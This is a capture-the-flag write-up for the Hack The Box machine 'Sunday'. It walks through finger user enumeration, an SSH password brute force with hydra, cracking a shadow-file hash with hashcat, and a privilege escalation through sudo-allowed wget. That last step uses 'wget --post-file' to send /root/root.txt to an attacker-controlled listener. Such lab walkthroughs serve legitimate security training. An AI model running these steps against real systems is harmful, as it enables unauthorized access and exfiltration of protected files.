# Sunday-HTB
Sunday is a Solaris box that is rated as easy. This box show some Finger enumeration.
# Recon
I started by runing nmap scan on the box.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Sunday]
└─$ nmap -sC -sV 10.10.10.76             
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 16:12 EDT
Nmap scan report for 10.10.10.76
Host is up (0.031s latency).
Not shown: 977 closed ports
PORT      STATE    SERVICE        VERSION
79/tcp    open     finger         Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open     rpcbind
416/tcp   filtered silverplatter
711/tcp   filtered cisco-tdp
722/tcp   filtered unknown
1037/tcp  filtered ams
1042/tcp  filtered afrog
1085/tcp  filtered webobjects
1094/tcp  filtered rootd
1812/tcp  filtered radius
1972/tcp  filtered intersys-cache
2007/tcp  filtered dectalk
2047/tcp  filtered dls
5033/tcp  filtered jtnetd-server
5822/tcp  filtered unknown
6009/tcp  filtered X11:9
6100/tcp  filtered synchronet-db
7103/tcp  filtered unknown
7777/tcp  filtered cbt
8292/tcp  filtered blp3
10180/tcp filtered unknown
16080/tcp filtered osxwebadmin
24444/tcp filtered unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.33 seconds
```
So we have ```finger``` running at port 79, you can find the script here: http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

let's enumerate it:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Sunday]
└─$ ./finger-user-enum.pl -U /usr/share/SecLists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10164
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Fri Sep  4 16:25:57 2020 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
sammy@10.10.10.76: sammy                 console      <Jul 31 17:59>..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Fri Sep  4 16:58:06 2020 #########
14 results.

10164 queries in 1929 seconds (5.3 queries / sec)
```
So we are now sure that there is two users ```sunny``` and ```sammy```. Let's try ssh brute force with hydra.

# User Flag
```
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l sunny -P rockyou.txt -s 22022 10.10.10.76 ssh -I -O eXAlgorithms=diffie-hellman-group1-sha1                                                                                                                             255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-04 17:18:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.10.10.76:22022/eXAlgorithms=diffie-hellman-group1-sha1
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-04 17:18:32
```
And we found a pssword for sunny :)

If you try ssh we will get this Error:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Sunday]
└─$ ssh sunny@10.10.10.76 -p 22022                                                                                                                                             
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange sha1,diffie-hellman-group1-sha1
```
So we need to specify a valid key exchange:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Sunday]
└─$ ssh sunny@10.10.10.76 -p 22022 -o KeXAlgorithms=diffie-hellman-group1-sha1                                                                                                                                                       255 ⨯
Password: 
Last login: Sat Sep  5 02:51:22 2020 from 10.10.14.28
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ id
uid=65535(sunny) gid=1(other) groups=1(other)
sunny@sunday:~$
```

Inside ```/backup``` you will find a coppy of ```/etc/shadow```:
```
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$ cat agent22.backup
cat: agent22.backup: Permission denied
```
So let's copy ```sammy``` hash and crack it:
```
kali@kali:~/Desktop/HTB/Sunday$ hashcat -m 7400 crack.txt rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 7 2700X Eight-Core Processor, 5847/5911 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Initializing backend runtime for device #1...
Host memory required for this attack: 65 MB




[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 11
* Bytes.....: 92
* Keyspace..: 11
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha256crypt $5$, SHA256 (Unix)
Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
Time.Started.....: Fri Sep  4 17:36:46 2020, (1 sec)
Time.Estimated...: Fri Sep  4 17:36:47 2020, (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       27 H/s (0.80ms) @ Accel:64 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 11/11 (100.00%)
Rejected.........: 0/11 (0.00%)
Restore.Point....: 0/11 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: 123456 -> cooldude!

Started: Fri Sep  4 17:35:49 2020
Stopped: Fri Sep  4 17:36:48 2020
```
So the password is ```cooldude!```, we can do now ```su sammy```:
```
sunny@sunday:/backup$ su sammy
Password: 
sunny@sunday:/backup$ id
uid=101(sammy) gid=10(staff) groups=10(staff)
```
Let's get User Flag:
```
sunny@sunday:/export/home/sammy/Desktop$ cat user.txt 
a3d94980...3ee8a598
```
# Root Flag

So by runing ```sudo -l`` we get this:
```
sunny@sunday:/backup$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```
We can get the root flag with it, so first start a listener:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Sunday]
└─$ nc -nlvp 4444            
listening on [any] 4444 ...
```
And run this on the Box:
```
sunny@sunday:~$ sudo wget --post-file /root/root.txt http://10.10.14.28:4444/
--03:46:54--  http://10.10.14.28:4444/
           => `index.html'
Connecting to 10.10.14.28:4444... connected.
HTTP request sent, awaiting response...
```
We got the flag :)
```
┌──(kali㉿kali)-[~/Desktop/HTB/Sunday]
└─$ nc -nlvp 4444            
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.76] 41444
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.28:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40fab61...c0d97af9b8
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
